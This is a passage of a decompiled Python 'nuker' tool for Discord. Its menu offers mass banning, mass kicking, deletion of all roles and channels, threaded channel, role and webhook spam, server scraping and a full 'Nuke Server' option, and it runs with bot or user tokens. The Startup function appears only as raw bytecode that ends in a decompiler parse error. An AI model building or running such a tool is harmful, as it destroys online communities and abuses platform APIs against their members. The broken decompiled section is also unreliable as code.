            roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Channels Name: {Fore.GREEN}")
        amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=(self.SpamChannels), args=(guild, name)).start()

    async def RoleSpamExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Roles Name: {Fore.GREEN}")
        amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=(self.SpamRoles), args=(guild, name)).start()

    def Credits(self):
        os.system(f"")
        print('\n                                                 ╔═══════════════════╗\n                                                 ║    ᴍʀ ᴄᴏᴍᴍᴜɴɪᴛʏ   ║\n                                  ╔═════════════════════════╦════════════════════════╗\n                                  ║               Created By Mr. Proxy               ║\n                                  ║                  Youtube Channel                 ║\n                                  ║            https://youtube.com/MrProxy1          ║\n                                  ║                      Discord                     ║\n                                  ║            https://discord.io/mrtools            ║\n                                  ╚══════════════════════════════════════════════════╝\n')

    async def Menu(self):
        os.system(f"cls & title Logined To  {client.user}")
        print(f"\n\n      {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n      {Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n      {Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n      {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n      {Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n      {colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n                          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                            ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━         \n\n                                                ╔══════════════════╗\n                                                ║     ᴍʀ ᴛᴏᴏʟs     ║\n                                                ╚══════════════════╝ \n                               ╔═════════════════════════╦════════════════════════╗\n                               ║ [1] Ban All             ║ [5] Create Channels    ║════════════╗\n                               ║ [2] Kick All            ║ [6] Create Roles       ║[C] Credits ║\n                               ║ [3] Delete All Roles    ║ [7] Create Webhooks    ║════════════╝  \n                               ║ [4] Delete All Channels ║ [8] Scrape Server Info ║\n                               ╚═════════════════════════╩════════════════════════╝\n                                       ╔═════════════════╦════════════════╗\n                                       ║ [N] Nuke Server ║ [X] Exit       ║ \n                                       ╚═════════════════╩════════════════╝\n \n\n        ")
        choice = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Option:{Fore.LIGHTBLACK_EX} {Fore.GREEN}")
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        else:
            pass
        if choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5 ':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'n':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == 'c' or choice == 'C':
            self.Credits()
            time.sleep(10)
            await self.Menu()
        elif choice == '7':
            amount = int(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}"))
            guild_id = int(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}"))
            message = str(input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Webhook Channel: {Fore.GREEN}"))
            await self.SpamWebhook(guild_id, amount, message)
            time.sleep(2)
            await self.Menu()
        else:
            if choice == 'x' or (choice == 'X'):
                os._exit(0)

    @client.event
    async def on_ready():
        await skid().Menu()

    def Startup--- This code section failed: ---

 L. 562         0  SETUP_FINALLY        48  'to 48'

 L. 563         2  LOAD_GLOBAL              token_type
                4  LOAD_STR                 'user'
                6  COMPARE_OP               ==
                8  POP_JUMP_IF_FALSE    26  'to 26'

 L. 564        10  LOAD_GLOBAL              client
               12  LOAD_ATTR                run
               14  LOAD_GLOBAL              token
               16  LOAD_CONST               False
               18  LOAD_CONST               ('bot',)
               20  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               22  POP_TOP          
               24  JUMP_FORWARD         44  'to 44'
             26_0  COME_FROM             8  '8'

 L. 565        26  LOAD_GLOBAL              token_type
               28  LOAD_STR                 'bot'
               30  COMPARE_OP               ==
               32  POP_JUMP_IF_FALSE    44  'to 44'

 L. 566        34  LOAD_GLOBAL              client
               36  LOAD_METHOD              run
               38  LOAD_GLOBAL              token
               40  CALL_METHOD_1         1  ''
               42  POP_TOP          
             44_0  COME_FROM            32  '32'
             44_1  COME_FROM            24  '24'
               44  POP_BLOCK        
               46  JUMP_FORWARD        224  'to 224'
             48_0  COME_FROM_FINALLY     0  '0'

 L. 567        48  POP_TOP          
               50  POP_TOP          
               52  POP_TOP          

 L. 568        54  LOAD_GLOBAL              print
               56  LOAD_GLOBAL              colors
               58  LOAD_ATTR                gray
               60  FORMAT_VALUE          0  ''
               62  LOAD_STR                 '['
               64  LOAD_GLOBAL              colors
               66  LOAD_ATTR                gray
               68  FORMAT_VALUE          0  ''
               70  LOAD_GLOBAL              Fore
               72  LOAD_ATTR                GREEN
               74  FORMAT_VALUE          0  ''
               76  LOAD_STR                 '√'
               78  LOAD_GLOBAL              Fore
               80  LOAD_ATTR                GREEN
               82  FORMAT_VALUE          0  ''
               84  LOAD_GLOBAL              colors
               86  LOAD_ATTR                gray
               88  FORMAT_VALUE          0  ''
               90  LOAD_STR                 ']'
               92  LOAD_GLOBAL              colors
               94  LOAD_ATTR                gray
               96  FORMAT_VALUE          0  ''
               98  LOAD_STR                 ' '
              100  LOAD_GLOBAL              Fore
              102  LOAD_ATTR                LIGHTBLACK_EX
              104  FORMAT_VALUE          0  ''
              106  LOAD_STR                 '· '
              108  LOAD_GLOBAL              colors
              110  LOAD_ATTR                gray
              112  FORMAT_VALUE          0  ''
              114  LOAD_STR                 '['
              116  LOAD_GLOBAL              colors
              118  LOAD_ATTR                gray
              120  FORMAT_VALUE          0  ''
              122  LOAD_GLOBAL              Fore
              124  LOAD_ATTR                LIGHTBLACK_EX
              126  FORMAT_VALUE          0  ''
              128  LOAD_GLOBAL              ok
              130  FORMAT_VALUE          0  ''
              132  LOAD_GLOBAL              Fore
              134  LOAD_ATTR                LIGHTBLACK_EX
              136  FORMAT_VALUE          0  ''
              138  LOAD_GLOBAL              colors
              140  LOAD_ATTR                gray
              142  FORMAT_VALUE          0  ''
              144  LOAD_STR                 '] '
              146  LOAD_GLOBAL              colors
              148  LOAD_ATTR                gray
              150  FORMAT_VALUE          0  ''
              152  LOAD_STR                 '['
              154  LOAD_GLOBAL              colors
              156  LOAD_ATTR                gray
              158  FORMAT_VALUE          0  ''
              160  LOAD_GLOBAL              Fore
              162  LOAD_ATTR                LIGHTBLACK_EX
              164  FORMAT_VALUE          0  ''
              166  LOAD_STR                 'Client'
              168  LOAD_GLOBAL              Fore
              170  LOAD_ATTR                LIGHTBLACK_EX
              172  FORMAT_VALUE          0  ''
              174  LOAD_GLOBAL              colors
              176  LOAD_ATTR                gray
              178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '] '
              182  LOAD_GLOBAL              Fore
              184  LOAD_ATTR                LIGHTBLACK_EX
              186  FORMAT_VALUE          0  ''
              188  LOAD_STR                 'Token Was Invalid '
              190  LOAD_GLOBAL              Fore
              192  LOAD_ATTR                GREEN
              194  FORMAT_VALUE          0  ''
              196  BUILD_STRING_31      31 
              198  CALL_FUNCTION_1       1  ''
              200  POP_TOP          

 L. 569       202  LOAD_GLOBAL              input
              204  CALL_FUNCTION_0       0  ''
              206  POP_TOP          

 L. 570       208  LOAD_GLOBAL              os
              210  LOAD_METHOD              _exit
              212  LOAD_CONST               0
              214  CALL_METHOD_1         1  ''
              216  POP_TOP          
              218  POP_EXCEPT       
              220  JUMP_FORWARD        224  'to 224'
              222  <48>             
            224_0  COME_FROM           220  '220'
            224_1  COME_FROM            46  '46'

Parse error at or near `<48>' instruction at offset 222


if __name__ == '__main__':
    skid().Startup()